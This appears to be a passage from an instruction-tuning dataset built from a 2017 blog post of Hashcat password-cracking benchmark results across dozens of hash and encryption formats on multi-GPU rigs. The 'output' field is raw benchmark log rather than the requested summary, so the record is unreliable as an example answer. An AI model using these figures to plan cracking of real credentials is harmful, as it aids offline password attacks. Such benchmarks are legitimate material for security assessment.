kH s 70.21ms Speed.Dev 2 23883.9 kH s 70.66ms Speed.Dev 3 23507.9 kH s 71.77ms Speed.Dev 4 21529.3 kH s 79.01ms Speed.Dev 92946.3 kH s Hashtype AIX ssha512 Speed.Dev 1 9321.3 kH s 92.05ms Speed.Dev 2 9202.6 kH s 93.32ms Speed.Dev 3 8825.9 kH s 48.57ms Speed.Dev 4 8897.6 kH s 48.12ms Speed.Dev 36247.4 kH s Hashtype Cisco-PIX MD5 Speed.Dev 1 22469.4 MH s 83.59ms Speed.Dev 2 22451.1 MH s 83.66ms Speed.Dev 3 21980.5 MH s 85.46ms Speed.Dev 4 22199.4 MH s 84.62ms Speed.Dev 89100.5 MH s Hashtype Cisco-ASA MD5 Speed.Dev 1 22860.6 MH s 82.14ms Speed.Dev 2 22863.9 MH s 82.14ms Speed.Dev 3 22380.0 MH s 83.94ms Speed.Dev 4 22641.0 MH s 82.96ms Speed.Dev 90745.6 MH s Hashtype Cisco-IOS type 4 SHA256 Speed.Dev 1 4368.7 MH s 53.51ms Speed.Dev 2 4350.4 MH s 53.76ms Speed.Dev 3 4249.9 MH s 55.00ms Speed.Dev 4 4318.2 MH s 54.14ms Speed.Dev 17287.2 MH s Hashtype Cisco-IOS 8 PBKDF2-SHA256 Speed.Dev 1 84279 H s 69.47ms Speed.Dev 2 84162 H s 69.58ms Speed.Dev 3 78890 H s 74.26ms Speed.Dev 4 79523 H s 73.72ms Speed.Dev 326.9 kH s Hashtype Cisco-IOS 9 scrypt Speed.Dev 1 24255 H s 590.80ms Speed.Dev 2 24029 H s 596.31ms Speed.Dev 3 23709 H s 604.39ms Speed.Dev 4 23774 H s 602.75ms Speed.Dev 95767 H s Hashtype Juniper NetScreen SSG ScreenOS Speed.Dev 1 17648.3 MH s 53.21ms Speed.Dev 2 17677.2 MH s 53.10ms Speed.Dev 3 17285.6 MH s 54.33ms Speed.Dev 4 17469.8 MH s 53.73ms Speed.Dev 70080.8 MH s Hashtype Juniper IVE Speed.Dev 1 14306.6 kH s 62.71ms Speed.Dev 2 14283.8 kH s 62.78ms Speed.Dev 3 13972.0 kH s 64.26ms Speed.Dev 4 14152.9 kH s 63.40ms Speed.Dev 56715.2 kH s Hashtype Samsung Android Password PIN Speed.Dev 1 7741.8 kH s 58.51ms Speed.Dev 2 7680.9 kH s 58.96ms Speed.Dev 3 7556.6 kH s 59.93ms Speed.Dev 4 7584.9 kH s 59.72ms Speed.Dev 30564.3 kH s Hashtype Citrix NetScaler Speed.Dev 1 10409.2 MH s 90.23ms Speed.Dev 2 10342.3 MH s 90.79ms Speed.Dev 3 10163.4 MH s 92.40ms Speed.Dev 4 10174.5 MH s 92.31ms Speed.Dev 41089.4 MH s Hashtype RACF Speed.Dev 1 3549.7 MH s 66.14ms Speed.Dev 2 3553.3 MH s 66.07ms Speed.Dev 3 3468.1 MH s 67.68ms Speed.Dev 4 3504.5 MH s 66.97ms Speed.Dev 14075.5 MH s Hashtype GRUB 2 Speed.Dev 1 61341 H s 95.47ms Speed.Dev 2 60492 H s 96.81ms Speed.Dev 3 53858 H s 54.44ms Speed.Dev 4 56225 H s 52.14ms Speed.Dev 231.9 kH s Hashtype Radmin2 Speed.Dev 1 11155.5 MH s 84.19ms Speed.Dev 2 11153.1 MH s 84.19ms Speed.Dev 3 10973.6 MH s 85.59ms Speed.Dev 4 9496.8 MH s 98.90ms Speed.Dev 42778.9 MH s Hashtype SAP CODVN B BCODE Speed.Dev 1 2513.3 MH s 46.70ms Speed.Dev 2 2485.7 MH s 47.18ms Speed.Dev 3 2472.0 MH s 47.45ms Speed.Dev 4 2478.4 MH s 47.32ms Speed.Dev 9949.4 MH s Hashtype SAP CODVN F G PASSCODE Speed.Dev 1 1329.2 MH s 88.32ms Speed.Dev 2 1325.2 MH s 88.58ms Speed.Dev 3 1269.8 MH s 92.44ms Speed.Dev 4 1255.6 MH s 93.49ms Speed.Dev 5180.0 MH s Hashtype SAP CODVN H PWDSALTEDHASH iSSHA-1 Speed.Dev 1 8628.7 kH s 52.36ms Speed.Dev 2 8523.9 kH s 52.96ms Speed.Dev 3 7976.6 kH s 56.64ms Speed.Dev 4 7796.2 kH s 58.00ms Speed.Dev 32925.4 kH s Hashtype Lotus Notes Domino 5 Speed.Dev 1 298.8 MH s 98.21ms Speed.Dev 2 298.9 MH s 98.17ms Speed.Dev 3 268.3 MH s 109.39ms Speed.Dev 4 291.4 MH s 100.71ms Speed.Dev 1157.5 MH s Hashtype Lotus Notes Domino 6 Speed.Dev 1 100.3 MH s 73.16ms Speed.Dev 2 100.2 MH s 73.20ms Speed.Dev 3 96971.1 kH s 75.67ms Speed.Dev 4 99021.0 kH s 74.10ms Speed.Dev 396.5 MH s Hashtype Lotus Notes Domino 8 Speed.Dev 1 947.3 kH s 47.94ms Speed.Dev 2 933.5 kH s 48.66ms Speed.Dev 3 915.6 kH s 49.61ms Speed.Dev 4 900.6 kH s 50.44ms Speed.Dev 3697.1 kH s Hashtype PeopleSoft Speed.Dev 1 11636.7 MH s 80.68ms Speed.Dev 2 11618.0 MH s 80.84ms Speed.Dev 3 10957.6 MH s 85.71ms Speed.Dev 4 10721.1 MH s 87.61ms Speed.Dev 44933.4 MH s Hashtype PeopleSoft PS_TOKEN Speed.Dev 1 4515.0 MH s 51.79ms Speed.Dev 2 4527.4 MH s 51.65ms Speed.Dev 3 4392.2 MH s 53.22ms Speed.Dev 4 4471.0 MH s 52.30ms Speed.Dev 17905.6 MH s Hashtype 7-Zip Speed.Dev 1 12789 H s 69.83ms Speed.Dev 2 12800 H s 69.77ms Speed.Dev 3 11590 H s 77.05ms Speed.Dev 4 11676 H s 76.49ms Speed.Dev 48855 H s Hashtype WinZip Speed.Dev 1 1524.0 kH s 64.38ms Speed.Dev 2 1505.3 kH s 65.21ms Speed.Dev 3 1449.9 kH s 67.76ms Speed.Dev 4 1483.8 kH s 66.17ms Speed.Dev 5963.0 kH s Hashtype RAR3-hp Speed.Dev 1 41530 H s 43.08ms Speed.Dev 2 41576 H s 43.04ms Speed.Dev 3 41219 H s 43.41ms Speed.Dev 4 41404 H s 43.22ms Speed.Dev 165.7 kH s Hashtype RAR5 Speed.Dev 1 51436 H s 69.48ms Speed.Dev 2 50720 H s 70.46ms Speed.Dev 3 44664 H s 80.02ms Speed.Dev 4 45944 H s 77.79ms Speed.Dev 192.8 kH s Hashtype AxCrypt Speed.Dev 1 161.8 kH s 144.49ms Speed.Dev 2 161.4 kH s 144.78ms Speed.Dev 3 142.6 kH s 163.92ms Speed.Dev 4 137.4 kH s 170.07ms Speed.Dev 603.2 kH s Hashtype AxCrypt in-memory SHA1 Speed.Dev 1 10695.4 MH s 87.80ms Speed.Dev 2 10759.7 MH s 87.29ms Speed.Dev 3 10311.3 MH s 91.08ms Speed.Dev 4 10547.0 MH s 89.05ms Speed.Dev 42313.3 MH s Hashtype TrueCrypt PBKDF2-HMAC-RIPEMD160 XTS 512 bit Speed.Dev 1 389.0 kH s 69.67ms Speed.Dev 2 385.7 kH s 70.28ms Speed.Dev 3 361.3 kH s 75.02ms Speed.Dev 4 378.7 kH s 71.55ms Speed.Dev 1514.8 kH s Hashtype TrueCrypt PBKDF2-HMAC-SHA512 XTS 512 bit Speed.Dev 1 575.2 kH s 84.40ms Speed.Dev 2 578.8 kH s 83.88ms Speed.Dev 3 516.8 kH s 94.00ms Speed.Dev 4 558.5 kH s 86.86ms Speed.Dev 2229.3 kH s Hashtype TrueCrypt PBKDF2-HMAC-Whirlpool XTS 512 bit Speed.Dev 1 51677 H s 273.98ms Speed.Dev 2 51919 H s 272.70ms Speed.Dev 3 49017 H s 144.80ms Speed.Dev 4 48341 H s 146.78ms Speed.Dev 201.0 kH s Hashtype TrueCrypt PBKDF2-HMAC-RIPEMD160 XTS 512 bit boot-mode Speed.Dev 1 737.1 kH s 63.97ms Speed.Dev 2 718.6 kH s 64.48ms Speed.Dev 3 692.4 kH s 68.03ms Speed.Dev 4 713.5 kH s 66.03ms Speed.Dev 2861.7 kH s Hashtype VeraCrypt PBKDF2-HMAC-RIPEMD160 XTS 512 bit Speed.Dev 1 1231 H s 71.51ms Speed.Dev 2 1177 H s 74.95ms Speed.Dev 3 985 H s 88.25ms Speed.Dev 4 1062 H s 83.43ms Speed.Dev 4455 H s Hashtype VeraCrypt PBKDF2-HMAC-SHA512 XTS 512 bit Speed.Dev 1 1225 H s 94.86ms Speed.Dev 2 1077 H s 106.48ms Speed.Dev 3 993 H s 58.86ms Speed.Dev"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hashcat Benchmarks for Nvidia GTX 1080TI & GTX 1070 Hashcat Benchmarks</title>\n<taxonomies>Author, How-To, Kent Ickler, Benchmarks, Hashcat Benchmarks, Kent Ickler, Nvidia GTX, Password Cracker, The Kraken</taxonomies>\n<creation_date>Tue, 20 Jun 2017 15:24:02 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "4 997 H s 58.62ms Speed.Dev 4292 H s Hashtype VeraCrypt PBKDF2-HMAC-Whirlpool XTS 512 bit Speed.Dev 1 93 H s 142.83ms Speed.Dev 2 92 H s 149.01ms Speed.Dev 3 62 H s 165.36ms Speed.Dev 4 62 H s 164.67ms Speed.Dev 308 H s Hashtype VeraCrypt PBKDF2-HMAC-RIPEMD160 XTS 512 bit boot-mode Speed.Dev 1 2464 H s 71.81ms Speed.Dev 2 2327 H s 76.19ms Speed.Dev 3 2092 H s 84.68ms Speed.Dev 4 1997 H s 88.40ms Speed.Dev 8880 H s Hashtype VeraCrypt PBKDF2-HMAC-SHA256 XTS 512 bit Speed.Dev 1 1604 H s 72.66ms Speed.Dev 2 1570 H s 74.16ms Speed.Dev 3 1438 H s 80.33ms Speed.Dev 4 1469 H s 78.79ms Speed.Dev 6081 H s Hashtype VeraCrypt PBKDF2-HMAC-SHA256 XTS 512 bit boot-mode Speed.Dev 1 4011 H s 72.68ms Speed.Dev 2 3750 H s 77.82ms Speed.Dev 3 3405 H s 85.24ms Speed.Dev 4 3560 H s 81.67ms Speed.Dev 14725 H s Hashtype Android FDE 4.3 Speed.Dev 1 1156.5 kH s 48.93ms Speed.Dev 2 1146.1 kH s 49.38ms Speed.Dev 3 1122.8 kH s 50.41ms Speed.Dev 4 1043.4 kH s 54.28ms Speed.Dev 4468.8 kH s Hashtype Android FDE Samsung DEK Speed.Dev 1 407.9 kH s 69.91ms Speed.Dev 2 406.6 kH s 70.13ms Speed.Dev 3 345.6 kH s 82.57ms Speed.Dev 4 332.8 kH s 85.76ms Speed.Dev 1492.9 kH s Hashtype eCryptfs Speed.Dev 1 18783 H s 95.33ms Speed.Dev 2 16878 H s 106.10ms Speed.Dev 3 16525 H s 54.07ms Speed.Dev 4 15993 H s 111.96ms Speed.Dev 68179 H s Hashtype MS Office 2003 0 1 MD5 RC4 Speed.Dev 1 316.7 MH s 92.67ms Speed.Dev 2 318.3 MH s 92.21ms Speed.Dev 3 299.4 MH s 98.04ms Speed.Dev 4 312.3 MH s 93.97ms Speed.Dev 1246.8 MH s Hashtype MS Office 2003 0 1 MD5 RC4 collider 1 Speed.Dev 1 449.4 MH s 65.30ms Speed.Dev 2 452.1 MH s 64.91ms Speed.Dev 3 440.0 MH s 66.70ms Speed.Dev 4 446.3 MH s 65.75ms Speed.Dev 1787.9 MH s Hashtype MS Office 2003 3 4 SHA1 RC4 Speed.Dev 1 413.4 MH s 70.99ms Speed.Dev 2 413.4 MH s 70.97ms Speed.Dev 3 403.3 MH s 72.77ms Speed.Dev 4 408.1 MH s 71.91ms Speed.Dev 1638.3 MH s Hashtype MS Office 2003 3 4 SHA1 RC4 collider 1 Speed.Dev 1 468.8 MH s 62.58ms Speed.Dev 2 467.9 MH s 62.68ms Speed.Dev 3 455.9 MH s 64.33ms Speed.Dev 4 462.3 MH s 63.49ms Speed.Dev 1854.9 MH s Hashtype MS Office 2007 Speed.Dev 1 188.7 kH s 49.74ms Speed.Dev 2 186.0 kH s 50.44ms Speed.Dev 3 174.3 kH s 53.85ms Speed.Dev 4 177.0 kH s 53.02ms Speed.Dev 725.9 kH s Hashtype MS Office 2010 Speed.Dev 1 93839 H s 49.99ms Speed.Dev 2 89562 H s 52.34ms Speed.Dev 3 82041 H s 57.19ms Speed.Dev 4 81473 H s 57.58ms Speed.Dev 346.9 kH s Hashtype MS Office 2013 Speed.Dev 1 12317 H s 95.10ms Speed.Dev 2 11802 H s 99.34ms Speed.Dev 3 11011 H s 53.16ms Speed.Dev 4 11354 H s 103.06ms Speed.Dev 46483 H s Hashtype PDF 1.1 1.3 Acrobat 2 4 Speed.Dev 1 464.3 MH s 63.21ms Speed.Dev 2 466.9 MH s 62.86ms Speed.Dev 3 453.8 MH s 64.65ms Speed.Dev 4 460.3 MH s 63.75ms Speed.Dev 1845.3 MH s Hashtype PDF 1.1 1.3 Acrobat 2 4 collider 1 Speed.Dev 1 521.7 MH s 56.25ms Speed.Dev 2 521.5 MH s 56.27ms Speed.Dev 3 507.7 MH s 57.80ms Speed.Dev 4 514.8 MH s 57.00ms Speed.Dev 2065.8 MH s Hashtype PDF 1.4 1.6 Acrobat 5 8 Speed.Dev 1 22496.1 kH s 38.20ms Speed.Dev 2 22924.7 kH s 38.21ms Speed.Dev 3 22350.3 kH s 39.22ms Speed.Dev 4 22577.5 kH s 38.73ms Speed.Dev 90348.7 kH s Hashtype PDF 1.7 Level 3 Acrobat 9 Speed.Dev 1 4355.4 MH s 53.69ms Speed.Dev 2 4348.8 MH s 53.73ms Speed.Dev 3 4254.7 MH s 54.92ms Speed.Dev 4 4319.3 MH s 54.14ms Speed.Dev 17278.3 MH s Hashtype PDF 1.7 Level 8 Acrobat 10 11 Speed.Dev 1 42594 H s 280.39ms Speed.Dev 2 43138 H s 276.86ms Speed.Dev 3 41731 H s 286.21ms Speed.Dev 4 42218 H s 282.90ms Speed.Dev 169.7 kH s Hashtype Password Safe v2 Speed.Dev 1 418.5 kH s 43.72ms Speed.Dev 2 429.7 kH s 42.78ms Speed.Dev 3 422.9 kH s 43.43ms Speed.Dev 4 417.1 kH s 43.82ms Speed.Dev 1688.2 kH s Hashtype Password Safe v3 Speed.Dev 1 1720.7 kH s 60.38ms Speed.Dev 2 1721.9 kH s 60.33ms Speed.Dev 3 1671.3 kH s 62.17ms Speed.Dev 4 1692.4 kH s 61.38ms Speed.Dev 6806.2 kH s Hashtype LastPass LastPass sniffed Speed.Dev 1 3309.0 kH s 50.93ms Speed.Dev 2 3302.2 kH s 51.06ms Speed.Dev 3 3209.3 kH s 52.52ms Speed.Dev 4 3252.3 kH s 51.82ms Speed.Dev 13072.9 kH s Hashtype 1Password agilekeychain Speed.Dev 1 4718.9 kH s 71.69ms Speed.Dev 2 4632.6 kH s 73.03ms Speed.Dev 3 4447.9 kH s 50.70ms Speed.Dev 4 4569.2 kH s 74.03ms Speed.Dev 18368.5 kH s Hashtype 1Password cloudkeychain Speed.Dev 1 15401 H s 95.07ms Speed.Dev 2 15401 H s 95.07ms Speed.Dev 3 14350 H s 51.03ms Speed.Dev 4 13424 H s 109.01ms Speed.Dev 58576 H s Hashtype Bitcoin Litecoin wallet.dat Speed.Dev 1 6157 H s 94.88ms Speed.Dev 2 5875 H s 99.83ms Speed.Dev 3 5298 H s 55.03ms Speed.Dev 4 4988 H s 58.61ms Speed.Dev 22318 H s Hashtype Blockchain My Wallet Speed.Dev 1 69811.3 kH s 18.88ms Speed.Dev 2 70970.3 kH s 18.13ms Speed.Dev 3 68251.4 kH s 19.73ms Speed.Dev 4 69527.6 kH s 18.98ms Speed.Dev 278.6 MH s Hashtype KeePass 1 AES Twofish and KeePass 2 AES Speed.Dev 1 192.5 kH s 202.42ms Speed.Dev 2 192.4 kH s 202.53ms Speed.Dev 3 182.3 kH s 213.68ms Speed.Dev 4 184.5 kH s 211.22ms Speed.Dev 751.7 kH s Hashtype ArubaOS Speed.Dev 1 9568.4 MH s 49.04ms Speed.Dev 2 9571.9 MH s 49.05ms Speed.Dev 3 9289.2 MH s 50.53ms Speed.Dev 4 9473.5 MH s 49.56ms Speed.Dev 37903.0 MH s Started Fri May 19 14 31 36 2017 _________ System 2 4x Nvidia GTX 1070 MB EVGA Z97 P N 142-HR-E977-KR CPU Intel i5-4460 Haswell 3.20GHz CPU-Cool heatsink cpu fan RAM G.Skill Sniper 16GB 2x8 DDR3 1600 PSU EVGA Supernova 1600 G2 HDD SSD 1TB OS Ubuntu 16.04 CASE Packages Hashcat 3.5.0 GPU 4x EVGA GeForce GTX 1070 FE hashcat v3.5.0 starting in benchmark mode OpenCL Platform 1 NVIDIA Corporation Device 1 GeForce GTX 1070 2028 8112 MB allocatable 15MCU Device 2 GeForce GTX 1070 2028 8114 MB allocatable 15MCU Device 3 GeForce GTX 1070 2028 8114 MB allocatable 15MCU Device 4 GeForce GTX 1070 2028 8114 MB allocatable 15MCU Hashtype MD4 Speed.Dev 1 33622.2 MH s 59.85ms Speed.Dev 2 32953.6 MH s 61.07ms Speed.Dev 3 33108.6 MH s 60.78ms Speed.Dev 4 34089.1 MH s 59.02ms Speed.Dev 133.8 GH s Hashtype MD5 Speed.Dev 1 18534.9 MH s 54.28ms Speed.Dev 2 17880.8 MH s 55.68ms Speed.Dev 3 18188.7 MH s 55.32ms Speed.Dev 4 18401.1 MH s 54.66ms Speed.Dev 73005.5 MH s Hashtype Half MD5 Speed.Dev 1 11493.6 MH s 87.56ms Speed.Dev 2 11296.1 MH s 89.08ms Speed.Dev 3 11253.8 MH s 89.42ms Speed.Dev 4 11526.1 MH s 87.30ms Speed.Dev 45569.7 MH s Hashtype SHA1 Speed.Dev 1 6083.1 MH s 82.71ms Speed.Dev 2 5937.4 MH s 84.74ms Speed.Dev 3 5951.8 MH s 84.54ms Speed.Dev 4 6063.9 MH s 82.96ms Speed.Dev 24036.2 MH s Hashtype SHA-256 Speed.Dev 1 2384.7 MH s 52.53ms Speed.Dev 2 2342.7 MH s 53.48ms Speed.Dev 3 2321.3 MH s 53.97ms Speed.Dev 4 2363.2 MH s 53.01ms Speed.Dev 9411.8 MH s Hashtype SHA-384 Speed.Dev 1 782.2 MH s 80.40ms Speed.Dev 2 772.1 MH s 81.46ms Speed.Dev 3 768.9 MH s 81.81ms Speed.Dev 4 785.4 MH s 80.07ms Speed.Dev 3108.6 MH s Hashtype SHA-512 Speed.Dev 1 804.9 MH s 78.12ms Speed.Dev 2 789.9 MH s 79.62ms Speed.Dev 3 791.3 MH s 79.48ms Speed.Dev 4 803.2 MH s 78.29ms Speed.Dev 3189.4 MH s Hashtype SHA-3 Keccak Speed.Dev 1 640.9 MH s 49.01ms Speed.Dev 2 617.6 MH s 50.86ms Speed.Dev 3 608.5 MH s 51.62ms Speed.Dev 4 640.4 MH s 49.04ms Speed.Dev 2507.4 MH s Hashtype SipHash Speed.Dev 1 21491.3 MH s 93.64ms Speed.Dev 2 21022.1 MH s 95.75ms Speed.Dev 3 21012.9 MH s 95.79ms Speed.Dev 4 21595.3 MH s 93.19ms Speed.Dev 85121.6 MH s Hashtype Skip32 PT salt key pass Speed.Dev 1 3975.6 MH s 2.08ms Speed.Dev 2 3932.8 MH s 2.11ms Speed.Dev 3 3896.2 MH s 2.13ms Speed.Dev 4 3921.7 MH s 2.10ms Speed.Dev 15726.4 MH s Hashtype RIPEMD-160 Speed.Dev 1 3599.3 MH s 69.89ms Speed.Dev 2 3543.3 MH s 71.00ms Speed.Dev 3 3532.3 MH s 71.22ms Speed.Dev 4 3600.0 MH s 69.87ms Speed.Dev 14274.9 MH s Hashtype Whirlpool Speed.Dev 1 193.2 MH s 162.60ms Speed.Dev 2 189.9 MH s 165.42ms Speed.Dev 3 188.9 MH s 166.37ms Speed.Dev 4 192.0 MH s 163.68ms Speed.Dev 764.0 MH s Hashtype GOST R 34.11-94 Speed.Dev 1 183.0 MH s 85.91ms Speed.Dev 2 180.0 MH s 87.35ms Speed.Dev 3 179.0 MH s 87.84ms Speed.Dev 4 181.9 MH s 86.42ms Speed.Dev 724.0 MH s Hashtype GOST R 34.11-2012 Streebog 256-bit Speed.Dev 1 38135.8 kH s 203.77ms Speed.Dev 2 37434.5 kH s 207.59ms Speed.Dev 3 37186.8 kH s 208.97ms Speed.Dev 4 37909.3 kH s 204.98ms Speed.Dev 150.7 MH s Hashtype GOST R 34.11-2012 Streebog 512-bit Speed.Dev 1 38165.2 kH s 203.61ms Speed.Dev 2 37194.3 kH s 208.93ms Speed.Dev 3 37207.1 kH s 208.85ms Speed.Dev 4 37942.2 kH s 204.80ms Speed.Dev 150.5 MH s Hashtype DES PT salt key pass Speed.Dev 1 13952.7 MH s 72.08ms Speed.Dev 2 13630.0 MH s 73.79ms Speed.Dev 3 13802.0 MH s 72.88ms Speed.Dev 4 13997.0 MH s 71.82ms Speed.Dev 55381.7 MH s Hashtype 3DES PT salt key pass Speed.Dev 1 438.6 MH s 71.69ms Speed.Dev 2 431.4 MH s 72.90ms Speed.Dev 3 428.8 MH s 73.32ms Speed.Dev 4 439.8 MH s 71.50ms Speed.Dev 1738.6 MH s Hashtype phpass WordPress MD5 phpBB3 MD5 Joomla MD5 Speed.Dev 1 5097.9 kH s 95.36ms Speed.Dev 2 4580.3 kH s 103.60ms Speed.Dev 3 4474.6 kH s 102.77ms Speed.Dev 4 5033.0 kH s 94.81ms Speed.Dev 19185.8 kH s Hashtype scrypt Speed.Dev 1 521.3 kH s 14.52ms Speed.Dev 2 529.4 kH s 14.29ms Speed.Dev 3 504.8 kH s 15.00ms Speed.Dev 4 542.7 kH s 13.90ms Speed.Dev 2098.2 kH s Hashtype PBKDF2-HMAC-MD5 Speed.Dev 1 5535.4 kH s 58.04ms Speed.Dev 2 5450.0 kH s 58.95ms Speed.Dev 3 5471.2 kH s 58.70ms Speed.Dev 4 5581.5 kH s 57.52ms Speed.Dev 22038.1 kH s Hashtype PBKDF2-HMAC-SHA1 Speed.Dev 1 2425.5 kH s 83.63ms Speed.Dev 2 2371.6 kH s 42.74ms Speed.Dev 3 2375.9 kH s 42.67ms Speed.Dev 4 2430.8 kH s 83.43ms Speed.Dev 9603.8 kH s Hashtype PBKDF2-HMAC-SHA256 Speed.Dev 1 876.8 kH s 59.78ms Speed.Dev 2 870.7 kH s 61.16ms Speed.Dev 3 874.5 kH s 60.89ms Speed.Dev 4 895.2 kH s 59.46ms Speed.Dev 3517.1 kH s Hashtype PBKDF2-HMAC-SHA512 Speed.Dev 1 323.9 kH s 86.34ms Speed.Dev 2 318.5 kH s 88.05ms Speed.Dev 3 319.2 kH s 87.86ms Speed.Dev 4 326.4 kH s 85.90ms Speed.Dev 1288.1 kH s Hashtype Skype Speed.Dev 1 9426.6 MH s 52.01ms Speed.Dev 2 9370.8 MH s 53.68ms Speed.Dev 3 9440.8 MH s 53.29ms Speed.Dev 4 9695.0 MH s 51.87ms Speed.Dev 37933.3 MH s Hashtype WPA WPA2 Speed.Dev 1 296.5 kH s 51.65ms Speed.Dev 2 290.1 kH s 52.79ms Speed.Dev 3 290.4 kH s 52.70ms Speed.Dev 4 298.0 kH s 51.39ms Speed.Dev 1175.1 kH s Hashtype IKE-PSK MD5 Speed.Dev 1 1249.5 MH s 100.68ms Speed.Dev 2 1278.4 MH s 49.19ms Speed.Dev 3 1274.4 MH s 49.35ms Speed.Dev 4 1317.4 MH s 95.11ms Speed.Dev 5119.6 MH s Hashtype IKE-PSK SHA1 Speed.Dev 1 587.0 MH s 53.51ms Speed.Dev 2 573.7 MH s 54.76ms Speed.Dev 3 572.9 MH s 54.82ms Speed.Dev 4 590.4 MH s 53.18ms Speed.Dev 2323.9 MH s Hashtype NetNTLMv1 NetNTLMv1 ESS Speed.Dev 1 16282.0 MH s 61.80ms Speed.Dev 2 15909.9 MH s 63.25ms Speed.Dev 3 15507.2 MH s 63.29ms Speed.Dev 4 16372.3 MH s 61.45ms Speed.Dev 64071.3 MH s Hashtype NetNTLMv2 Speed.Dev 1 1226.7 MH s 51.25ms Speed.Dev 2 1198.0 MH s 52.49ms Speed.Dev 3 1195.6 MH s 52.58ms Speed.Dev 4 1227.9 MH s 51.20ms Speed.Dev 4848.2 MH s Hashtype IPMI2 RAKP HMAC-SHA1 Speed.Dev 1 1214.1 MH s 50.91ms Speed.Dev 2 1215.1 MH s 51.75ms Speed.Dev 3 1209.8 MH s 51.98ms Speed.Dev 4 1244.9 MH s 50.50ms Speed.Dev 4883.9 MH s Hashtype Kerberos 5 AS-REQ Pre-Auth etype 23 Speed.Dev 1 219.2 MH s 71.72ms Speed.Dev 2 214.5 MH s 73.32ms Speed.Dev 3 214.1 MH s 73.46ms Speed.Dev 4 218.8 MH s 71.84ms Speed.Dev 866.6 MH s Hashtype Kerberos 5 TGS-REP etype 23 Speed.Dev 1 218.9 MH s 71.81ms Speed.Dev 2 214.1 MH s 73.44ms Speed.Dev 3 213.3 MH s 73.72ms Speed.Dev 4 218.6 MH s 71.91ms Speed.Dev 864.9 MH s Hashtype DNSSEC NSEC3 Speed.Dev 1 2521.0 MH s 49.68ms Speed.Dev 2 2455.0 MH s 51.03ms Speed.Dev 3 2445.0 MH s 51.24ms Speed.Dev 4 2525.2 MH s 49.60ms Speed.Dev 9946.2 MH s Hashtype PostgreSQL CRAM MD5 Speed.Dev 1 4959.3 MH s 50.72ms Speed.Dev 2 4852.7 MH s 51.84ms Speed.Dev 3 4849.3 MH s 51.87ms Speed.Dev 4 5003.9 MH s 50.25ms Speed.Dev 19665.2 MH s Hashtype MySQL CRAM SHA1 Speed.Dev 1 1709.6 MH s 73.29ms Speed.Dev 2 1678.1 MH s 74.66ms Speed.Dev 3 1670.3 MH s 75.02ms Speed.Dev 4 1711.7 MH s 73.19ms Speed.Dev 6769.8 MH s Hashtype SIP digest authentication MD5 Speed.Dev 1 1505.2 MH s 83.25ms Speed.Dev 2 1469.5 MH s 85.27ms Speed.Dev 3 1465.1 MH s 85.53ms Speed.Dev 4 1498.1 MH s 83.63ms Speed.Dev 5937.9 MH s Hashtype SMF Simple Machines Forum v1.1 Speed.Dev 1 5150.0 MH s 48.84ms Speed.Dev 2 4996.3 MH s 50.34ms Speed.Dev 3 5017.7 MH s 50.13ms Speed.Dev 4 5163.9 MH s 48.69ms Speed.Dev 20327.9 MH s Hashtype vBulletin v3.8.5 Speed.Dev 1 5124.4 MH s 98.19ms Speed.Dev 2 5078.3 MH s 49.54ms Speed.Dev 3 5067.3 MH s 49.64ms Speed.Dev 4 5170.2 MH s 97.31ms Speed.Dev 20440.2 MH s Hashtype vBulletin v3.8.5 Speed.Dev 1 3587.0 MH s 70.13ms Speed.Dev 2 3472.0 MH s 72.46ms Speed.Dev 3 3511.7 MH s 71.63ms Speed.Dev 4 3592.0 MH s 70.02ms Speed.Dev 14162.8 MH s Hashtype IPB2 Invision Power Board MyBB 1.2 Speed.Dev 1 3724.1 MH s 67.55ms Speed.Dev 2 3644.8 MH s 69.02ms Speed.Dev 3 3629.7 MH s 69.31ms Speed.Dev 4 3735.4 MH s 67.33ms Speed.Dev 14734.0 MH s Hashtype WBB3 Woltlab Burning Board Speed.Dev 1 949.9 MH s 66.21ms Speed.Dev 2 917.7 MH s 68.53ms Speed.Dev 3 928.0 MH s 67.77ms Speed.Dev 4 952.7 MH s 66.00ms Speed.Dev 3748.4 MH s Hashtype OpenCart Speed.Dev 1 1517.5 MH s 82.57ms Speed.Dev 2 1464.4 MH s 85.55ms Speed.Dev 3 1476.6 MH s 84.85ms Speed.Dev 4 1530.1 MH s 81.87ms Speed.Dev 5988.6 MH s Hashtype Joomla 2.5.18 Speed.Dev 1 18142.8 MH s 55.46ms Speed.Dev 2 17645.1 MH s 57.03ms Speed.Dev 3 17620.0 MH s 57.11ms Speed.Dev 4 18255.3 MH s 55.11ms Speed.Dev 71663.1 MH s Hashtype PHPS Speed.Dev 1 5138.9 MH s 97.91ms Speed.Dev 2 5039.4 MH s 49.91ms Speed.Dev 3 4997.9 MH s 49.98ms Speed.Dev 4 5168.6 MH s 97.35ms Speed.Dev 20344.9 MH s Hashtype Drupal7 Speed.Dev 1 41724 H s 91.83ms Speed.Dev 2 40690 H s 94.11ms Speed.Dev 3 40936 H s 93.59ms Speed.Dev 4 41903 H s 91.30ms Speed.Dev 165.3 kH s Hashtype osCommerce xt Commerce Speed.Dev 1 9619.0 MH s 52.30ms Speed.Dev 2 9418.3 MH s 53.42ms Speed.Dev 3 9326.9 MH s 53.94ms Speed.Dev 4 9596.5 MH s 52.42ms Speed.Dev 37960.8 MH s Hashtype PrestaShop Speed.Dev 1 6069.6 MH s 82.90ms Speed.Dev 2 5902.6 MH s 85.25ms Speed.Dev 3 5877.5 MH s 85.61ms Speed.Dev 4 6094.5 MH s 82.55ms Speed.Dev 23944.2 MH s Hashtype Django SHA-1 Speed.Dev 1 5135.8 MH s 48.97ms Speed.Dev 2 4962.2 MH s 50.69ms Speed.Dev 3 4966.8 MH s 50.64ms Speed.Dev 4 5138.0 MH s 48.94ms Speed.Dev 20202.8 MH s Hashtype Django PBKDF2-SHA256 Speed.Dev 1 44292 H s 70.74ms Speed.Dev 2 43508 H s 72.15ms Speed.Dev 3 43785 H s 71.70ms Speed.Dev 4 44754 H s 70.13ms Speed.Dev 176.3 kH s Hashtype MediaWiki B type Speed.Dev 1 4846.4 MH s 51.90ms Speed.Dev 2 4772.2 MH s 52.71ms 